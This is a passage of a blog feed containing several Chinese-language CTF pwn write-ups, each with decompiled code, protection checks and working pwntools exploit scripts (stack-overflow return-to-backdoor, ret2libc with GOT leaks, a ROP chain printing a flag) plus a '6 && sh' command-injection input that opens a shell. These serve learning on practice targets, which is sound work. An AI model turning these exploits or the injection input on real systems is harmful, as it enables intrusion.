    <content type="html"><![CDATA[<h2 id="1-分析">1.分析</h2><p>拿到题目先用checksec检查发现没有开启canary保护,用IDA64分析发现<code>gets(v4)</code>有栈溢出的漏洞可以利用,又发现有直接返回shell的outBackdoor函数.<br>直接执行程序发现权限不足,使用<code>chmod 755 outBackdoor</code>来提权<br>用cyclic生成一串大于16的字符串复制下来<br><code>cyclic 32 aaaabaaacaaadaaaeaaafaaagaaahaaa</code><br>对文件gdb调试,输入字符串,出现栈溢出<br><code>*RSP  0x7fffffffdd78 ◂— 'gaaahaaa'</code><br>经过计算发现是在前24个字符时的位置出现,<br>所以需要在这个位置覆盖上返回shell的函数地址.</p><h2 id="2-exploitation">2.exploitation</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;ip&#x27;</span>,&lt;port&gt;)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(<span class="number">0x4011D7</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>发现没有成功返回shell,上网查找发现貌似和system函数有关,更换地址为后门函数地址的下一个地址<code>0x4011D8</code>成功跳转到函数,返回shell.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">W...w...Wait? Who put this backdoor out back here?</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libc-2.27.so</span><br><span class="line">outBackdoor</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-分析&quot;&gt;1.分析&lt;/h2&gt;
&lt;p&gt;拿到题目先用checksec检查发现没有开启canary保护,用IDA64分析发现&lt;code&gt;gets(v4)&lt;/code&gt;有栈溢出的漏洞可以利用,又发现有直接返回shell的outBackdoor函数.&lt;br&gt;
直接执行程序</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>OGeek2019babyrop 1</title>
    <link href="https://www.fomal.cc/posts/875b5e79.html"/>
    <id>https://www.fomal.cc/posts/875b5e79.html</id>
    <published>2023-04-09T10:13:34.853Z</published>
    <updated>2023-04-09T10:15:46.725Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-伪代码">1.伪代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">process</span><span class="params">(<span class="type">int</span> privous_buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> sucLen; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, privous_buf);               <span class="comment">// print the random integer into s</span></span><br><span class="line">  sucLen = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);                 <span class="comment">// guess the random</span></span><br><span class="line">  buf[sucLen - <span class="number">1</span>] = <span class="number">0</span>;                          <span class="comment">// &#x27;\x00&#x27;</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )                    <span class="comment">// compare NULL and the random integer</span></span><br><span class="line">                                                <span class="comment">// definitely the return is True and execute exit()</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);                    <span class="comment">// if not ,this is the notice</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">process2</span><span class="params">(<span class="type">char</span> buf7)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( buf7 == <span class="number">127</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">200u</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, buf7);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  initialization();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = process1(buf);                           <span class="comment">// give buf a random value</span></span><br><span class="line">  process2(v2);                                 <span class="comment">// v2 is the process&#x27;s buf[7]</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞分析">2.漏洞分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看到程序没有开启PIE防护,那么就可以用常见的ret2libc手法来解决问题了.</p><p>程序的执行流和攻击手段大概解释一下,先生成一个随机数,将四位随机数传入到<code>process1()</code>,在p1函数里面有一个分支,要输入一个数字来和随机数比较,不同则结束,相同则继续,这里需要知道的是<code>strcmp()</code>如果其中一个字符串读取到<code>'\0'</code>的时候就会结束.当p1函数结束的时候将会返回<code>buf[7]</code>到<code>process2()</code>来进行下一个分支判断,这里打开点思路,在<code>buf[0]</code>就传入<code>'\0'</code>然后把我们需要的数字传入到<code>buf[7]</code>里面,p2函数里的buf非常大,如果只是<code>buf[7]</code>改成127会无法溢出,但是如果改成大的数字就可以狠狠地溢出了.</p><p>构造完栈溢出漏洞之后,因为程序的.plt没有<code>system()</code>,也没有给出glibc的版本,就需要我们手动泄露版本然后调用<code>system(&quot;bin/sh&quot;)</code></p><p>这里顺便复习一下步骤,这里没开PIE就直接用ELF方法来找,有开就得想办法泄露出程序的加载基地址然后再获取某些库函数的.plt和.got地址.</p><h3 id="1-获取程序中有的函数的write-plt和read-got地址">(1) 获取程序中有的函数的write@plt和read@got地址</h3><p>这里的<code>read()</code>也可以是别的函数,实在没有就<code>__libc_start_main</code>也是完全ok的,</p><p>用plt是拿来覆盖返回地址的,用got则是因为got存了libc函数的真实地址,可以拿去给做<code>write()</code>的参数.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0xdeadbeef</span> <span class="comment">#这个是返回地址</span></span><br></pre></td></tr></table></figure><h3 id="2-构造ROP链来泄露库函数真实地址">(2) 构造ROP链来泄露库函数真实地址</h3><p>由于这里构造的是32位程序的ROP链,如果是64位的还需要获得pop ret系列的gadgets</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=cyclic(offset)+p32(write_plt)+p32(main)+p32(read_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&quot;read_addr:&quot;</span><span class="built_in">hex</span>(read_addr))</span><br></pre></td></tr></table></figure><h3 id="3-泄露glibc版本并获取需要函数的真实地址">(3) 泄露glibc版本并获取需要函数的真实地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lic=LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">info(<span class="string">&quot;system:&quot;</span>system)</span><br></pre></td></tr></table></figure><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29693</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x08048825&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;\x00&#x27;</span>+<span class="number">6</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0xffffffff</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0xE7</span>+<span class="number">0x4</span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line">payload2=cyclic(offset)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">read_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&#x27;read_addr:&#x27;</span>+<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">base=read_addr-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;bin/sh&#x27;</span>)) <span class="comment">##要以字节型数据来搜索!</span></span><br><span class="line">payload3=cyclic(offset)+p32(system_addr)+<span class="string">b&#x27;dead&#x27;</span>+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4">4.</h2><p>这题解不出来有以下几个知识点</p><h3 id="1">(1)</h3><p>不确定<code>strcmp()</code>在遇到<code>'\0'</code>的时候会直接停止比较来跳过,实际上是会的</p><h3 id="2">(2)</h3><p>忘记了题目没开PIE可以直接拿glibc的函数先ret的,还有忽略了题目已经给出了libc的版本…</p><h3 id="3">(3)</h3><p>忘记写注释导致第二次找不到真正攻击的漏洞是第二个函数的else判断.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-伪代码&quot;&gt;1.伪代码&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>not_the_same_3dsctf_2016</title>
    <link href="https://www.fomal.cc/posts/de339b6d.html"/>
    <id>https://www.fomal.cc/posts/de339b6d.html</id>
    <published>2023-04-09T10:13:34.852Z</published>
    <updated>2023-04-09T10:15:46.734Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要">摘要</h2><p>一道很简单的ret2libc1,但是被细节薄纱.</p><h2 id="1-逆向">1.逆向</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_secret</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">45</span>]; <span class="comment">// [esp+Fh] [ebp-2Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-分析">2.分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>程序是静态链接,不过也没有给出<code>system()</code>,看到有一个后门函数直接把flag读进bss段里,但是没有直接输出,这里就需要构造ROP链来解决,这里刚好有<code>write()</code>就直接用了,再看汇编:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">; int get_secret()</span><br><span class="line">public get_secret</span><br><span class="line">get_secret proc near</span><br><span class="line"></span><br><span class="line">var_1C= dword ptr -1Ch</span><br><span class="line">var_18= dword ptr -18h</span><br><span class="line">var_14= dword ptr -14h</span><br><span class="line"></span><br><span class="line">push    esi</span><br><span class="line">sub     esp, 18h</span><br><span class="line">mov     [esp+1Ch+var_18], offset unk_80CF91B</span><br><span class="line">mov     [esp+1Ch+var_1C], offset aFlagTxt ; &quot;flag.txt&quot;</span><br><span class="line">call    fopen</span><br><span class="line">mov     esi, eax</span><br><span class="line">mov     [esp+1Ch+var_14], esi</span><br><span class="line">mov     [esp+1Ch+var_18], 2Dh ; &#x27;-&#x27;</span><br><span class="line">mov     [esp+1Ch+var_1C], offset fl4g</span><br><span class="line">call    fgets</span><br><span class="line">mov     [esp+1Ch+var_1C], esi</span><br><span class="line">call    fclose</span><br><span class="line">add     esp, 18h</span><br><span class="line">pop     esi</span><br><span class="line">retn</span><br><span class="line">get_secret endp</span><br></pre></td></tr></table></figure><p>调用<code>main()</code>时并没有压入ebp,所以直接用IDA给的偏移不用加0x4,由于函数没有关缓冲区,所以我们在使用<code>write()</code>打印flag的时候还需要追加一个<code>exit()</code>来关闭程序让缓冲区的flag被吐出来.</p><p>然后就是把笔者薄纱的地址前导0问题了,之前用的大多数都是pwntools的方法来取地址,这次心血来潮直接IDA里复制带上了前导的0,没有打通😭,后来用了pwntools打印了地址对比才发现问题,最后附上exp.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25236</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x2d</span></span><br><span class="line">get_secret=<span class="number">0x80489A0</span></span><br><span class="line">write=<span class="number">0x806E270</span> <span class="comment">##细节不加前导0否则不通</span></span><br><span class="line">flag=<span class="number">0x80ECA2D</span></span><br><span class="line">exit=<span class="number">0x804E660</span></span><br><span class="line"><span class="comment">#pop3_ret=0x80483b8</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(get_secret)+p32(write)+p32(exit)+p32(<span class="number">1</span>)+p32(flag)+p32(<span class="number">45</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-总结">4.总结</h2><p>地址别加前导0! 😭</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;摘要&quot;&gt;摘要&lt;/h2&gt;
&lt;p&gt;一道很简单的ret2libc1,但是被细节薄纱.&lt;/p&gt;
&lt;h2 id=&quot;1-逆向&quot;&gt;1.逆向&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>just test nc &amp;&amp; database Write Up</title>
    <link href="https://www.fomal.cc/posts/86c9736c.html"/>
    <id>https://www.fomal.cc/posts/86c9736c.html</id>
    <published>2023-04-09T10:13:34.850Z</published>
    <updated>2023-04-09T10:15:46.733Z</updated>
    
    <content type="html"><![CDATA[<p>1.用netcat连上地址就能看到flag,cat一下获取</p><p>2.当选择6退出系统时,6对应的函数有很严重的bug,会用system执行echo s,s就是输入的命令,我们只需要用&amp;&amp;同时输入多条命令调用shell即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(command, <span class="string">&quot;echo %s&quot;</span>, s);</span><br><span class="line">system(command);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">6 &amp;&amp; sh   </span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">pwn</span><br><span class="line"><span class="built_in">cat</span> flag</span><br><span class="line">......</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.用netcat连上地址就能看到flag,cat一下获取&lt;/p&gt;
&lt;p&gt;2.当选择6退出系统时,6对应的函数有很严重的bug,会用system执行echo s,s就是输入的命令,我们只需要用&amp;amp;&amp;amp;同时输入多条命令调用shell即可&lt;/p&gt;
&lt;figure c</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_le vel3 WP</title>
    <link href="https://www.fomal.cc/posts/b1cdfc12.html"/>
    <id>https://www.fomal.cc/posts/b1cdfc12.html</id>
    <published>2023-04-09T10:13:34.849Z</published>
    <updated>2023-04-09T10:15:46.733Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要">摘要</h2><p>差不多的模板懒得写分析了,直接贴上exp,这里因为两个LibcSearcher的原因,云端的LibcSearcher找不到Libc版本,但是本地的版本又太旧了,所以我直接把两个版本删了重新安装了的本地LibcSearcher,最后总算打通了😭.</p><h2 id="1-逆向">1.逆向</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">256u</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">14u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞分析">2.漏洞分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28812</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x8048484</span></span><br><span class="line">offset=<span class="number">0x88</span>+<span class="number">0x4</span></span><br><span class="line">ret=<span class="number">0x80482da</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause(1)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;摘要&quot;&gt;摘要&lt;/h2&gt;
&lt;p&gt;差不多的模板懒得写分析了,直接贴上exp,这里因为两个LibcSearcher的原因,云端的LibcSearcher找不到Libc版本,但是本地的版本又太旧了,所以我直接把两个版本删了重新安装了的本地LibcSearcher,最后总算</summary>
      
    
    
    
